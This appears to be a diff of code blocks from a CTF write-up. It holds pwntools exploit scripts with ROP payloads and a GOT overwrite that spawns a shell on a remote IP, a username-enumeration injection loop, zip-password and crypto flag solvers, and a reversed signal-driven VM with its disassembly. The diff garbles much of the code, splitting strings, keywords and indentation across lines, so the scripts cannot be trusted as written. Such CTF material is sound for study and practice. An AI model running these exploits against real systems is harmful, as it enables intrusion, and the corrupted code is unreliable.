@@ -39,13 +39,9 @@ Content-Disposition: form-data; name="path"
  
 ./templates
 -----------------------------33068241626403375462622000045--
-```
-
-
-
-```
 import requests
-url = "http://47.106.172.144:2333/?pass=husins&user="
+url = "http://47.106.172.144:
+2333/?pass=husins&user="
 space = "*"
 letter_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
                 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
@@ -60,11 +56,6 @@ for j in user:
             print(j + i)
         if "用户查询不唯一" in resp.text:
             print(j + i)
-```
-
-
-
-```
 import zipfile
 import re
 zipname = "yasuobao.zip"
@@ -76,11 +67,6 @@ while True:
     passwd = res.group()
     ts1.extractall("001\ziptest\",pwd=passwd)
     zipname = "001\ziptest\"+ts1.namelist()[0]
-```
-
-
-
-```
 A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544)
 p = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843
 g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977
@@ -97,11 +83,6 @@ cipher = AES.new(key, AES.MODE_ECB)
 ct = bytes.fromhex("ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c")
 flag = cipher.decrypt(ct)
 print(flag)
-```
-
-
-
-```
 package com.yq1ng.Utils;
 import java.math.BigInteger;
 import java.security.SecureRandom;
@@ -255,15 +236,10 @@ public class test {
             System.out.println(Utils.getPrime(1024));
     }
 }
-```
-
-
-
-```
 # -*- coding: utf-8 -*-
 from pwn import *
 p=process('./1')
-#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
+    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
 elf=ELF('./1')
 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
 context.log_level='debug'
@@ -298,21 +274,17 @@ while True:
     try:
         p=remote('47.106.172.144',65003)
         pwn()
-    except:
+    
+except:
         p.close()
         continue
-```
-
-
-
-```
 # -*- coding: utf-8 -*-
 from pwn import *
 p=process('./1')
 elf=ELF('./1')
 
-#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
-#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
+    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
+    #libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
 libc=ELF('libc-2.23.so')
 print hex(libc.sym['printf'])
 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
@@ -329,8 +301,8 @@ pop_rbp=0x000000000040114d
 lea_ret=0x00000000004011d3
 
 payload=p64(0x4011A9)+p64(0x4011FF)+p64(0x401080)
-#payload=p64(pop_rdi)+p64(elf.got['read'])+p64(0x40122F)
-#payload=p64(0x4011FB)
+    #payload=p64(pop_rdi)+p64(elf.got['read'])+p64(0x40122F)
+    #payload=p64(0x4011FB)
 def pwn():
     p.send(payload)
     p.recvuntil('where are you from? my frends??')
@@ -348,22 +320,18 @@ while True:
     try:
         p=remote('47.106.172.144',65004)
         pwn()
-    except:
+    
+except:
         p.close()
         continue
-```
-
-
-
-```
 # -*- coding: utf-8 -*-
 from pwn import *
-#p=process('./1')
+    #p=process('./1')
 p=remote('47.106.172.144',65001)
 elf=ELF('./1')
-#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
-#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
-#libc=ELF('libc-2.23.so')
+    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
+    #libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
+    #libc=ELF('libc-2.23.so')
 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
 context.log_level='debug'
 def debug():
@@ -418,16 +386,11 @@ libc_address=a-88-0x3c4b10-0x10
 lg('libc_address',libc_address)
 pause()
 overwrite(0,8,8,elf.got['atoi'])
-#edit(2,0,libc.sym['system'])
+    #edit(2,0,libc.sym['system'])
 edit(2,0,libc_address+0x0453a0)
-#debug()
+    #debug()
 menu('/bin/shx00')
 p.interactive()
-```
-
-
-
-```
 int __thiscall sub_403B70(void *this, char a2)
 {
   char v3[65]; // [esp+Fh] [ebp-45h] BYREF
@@ -437,11 +400,6 @@ int __thiscall sub_403B70(void *this, char a2)
   sub_406170(v3);
   return ++dword_4DD8F8;
 }
-```
-
-
-
-```
 int sub_40144B()
 {
  struct sigaction v1; // [rsp+0h] [rbp-140h] BYREF
@@ -496,11 +454,6 @@ int sub_40144B()
  v2.sa_flags = 0;
  return sigaction(47, &v2, &v1);
 }
-```
-
-
-
-```
 00000000 vm              struc ; (sizeof=0x16, mappedto_28)
 00000000 stack_ptr           dq ?                    ; offset
 00000008 data_ptr            dq ?                    ; offset
@@ -521,16 +474,12 @@ char *sub_4012C8()
 }
 dump出0x4019c0, opcode
 17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18
-```
-
-
-
-```
 opcode=[17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18]
 data=[0]*512
 cnt=0
 target=0
-def sig_hand(sig:int,a1=None):
+def sig_hand(sig:
+int,a1=None):
    global cnt
    s='unknown:{}'.format(sig)
    if sig==34:
@@ -625,82 +574,134 @@ while cnt<len(opcode):
    else:
        s=sig_hand(2)
    print("%02d:%s"%(last_cnt,s))
-```
-
-
-
-```
-00:call 52 ; strlen
-02:push 42
-04:pop rbx
-05:test rax,rbx
+00:
+call 52 ; strlen
+02:
+push 42
+04:
+pop rbx
+05:
+test rax,rbx
 06:jz 9
-08:check
-09:push 36
-11:pop rbx
-12:push rcx
-13:call 29
-15:pop rcx
-16:push 0
-18:pop rbx
-19:push rcx
-20:call 64
-22:pop rcx
-23:push 72
-25:pop rbx
-26:call 29
-28:check
-29:sub rcx,1
-31:push data[rcx]
-32:pop rax
-33:xor rax,rbx
-34:push rax
-35:pop data[rcx]
-36:push rbx
-37:push 0
-39:pop rax
-40:push rcx
-41:pop rbx
-42:test rax,rbx
+08:
+check
+09:
+push 36
+11:
+pop rbx
+12:
+push rcx
+13:
+call 29
+15:
+pop rcx
+16:
+push 0
+18:
+pop rbx
+19:
+push rcx
+20:
+call 64
+22:
+pop rcx
+23:
+push 72
+25:
+pop rbx
+26:
+call 29
+28:
+check
+29:
+sub rcx,1
+31:
+push data[rcx]
+32:
+pop rax
+33:
+xor rax,rbx
+34:
+push rax
+35:
+pop data[rcx]
+36:
+push rbx
+37:
+push 0
+39:
+pop rax
+40:
+push rcx
+41:
+pop rbx
+42:
+test rax,rbx
 43:jz 50
-45:pop rbx
-46:add rbx,2
-48:jmp 29
-50:pop rbx
-51:ret
-52:push data[rcx]
-53:pop rax
-54:test rax,rbx
+45:
+pop rbx
+46:
+add rbx,2
+48:
+jmp 29
+50:
+pop rbx
+51:
+ret
+52:
+push data[rcx]
+53:
+pop rax
+54:
+test rax,rbx
 55:jz 61
-57:add rcx,1
-59:jmp 52
-61:push rcx
-62:pop rax
-63:ret
-64:sub rcx,1
-66:push data[rcx]
-67:pop rax
-68:add rax,rbx
-69:push rax
-70:pop data[rcx]
-71:push rbx
-72:push 0
-74:pop rax
-75:push rcx
-76:pop rbx
-77:test rax,rbx
+57:
+add rcx,1
+59:
+jmp 52
+61:
+push rcx
+62:
+pop rax
+63:
+ret
+64:
+sub rcx,1
+66:
+push data[rcx]
+67:
+pop rax
+68:
+add rax,rbx
+69:
+push rax
+70:
+pop data[rcx]
+71:
+push rbx
+72:
+push 0
+74:
+pop rax
+75:
+push rcx
+76:
+pop rbx
+77:
+test rax,rbx
 78:jz 85
-80:pop rbx
-81:add rbx,1
-83:jmp 64
-85:pop rbx
-86:ret
-```
-
-
-
-```
-t=[i for i in b'xa3xd8xacxa9xa8xd6xa6xcdxd0xd5xf7xb7x9cxb31-@[K:xfdWB_XRTx1bx0cx9-xd9=5x1ftA@GBx11']
+80:
+pop rbx
+81:
+add rbx,1
+83:
+jmp 64
+85:
+pop rbx
+86:
+ret
+t=[i for i in b'xa3xd8xacxa9xa8xd6xa6xcdxd0xd5xf7xb7x9cxb31-@[K:
+xfdWB_XRTx1bx0cx9-xd9=5x1ftA@GBx11']
 rbx=72
 for i in range(len(t)-1,-1,-1):
    t[i]^=rbx
@@ -720,11 +721,6 @@ for i in range(len(t)-1,-1,-1):
    rbx&=0xff
 print(t)
 print(bytes(t))
-```
-
-
-
-```
 data=[0x9E,0xE7,0x30,0x5F,0xA7,0x01,0xA6,0x53,0x59,0x1B,0x0A,0x20,0xF1,0x73,0xD1,0x0E,0xAB,0x09,0x84,0x0E,0x8D, 0x2B]
 tem=[0xda,0xa9,0x73,0x1A,0xFE,0x4D,0xED,0x12,0x1E,0x66,0x5C,0x6D,0x8C,0x3C,0x96,0x49,0xFD,0x74,0xDF,0x43,0xDA,0x74]
 flag=''
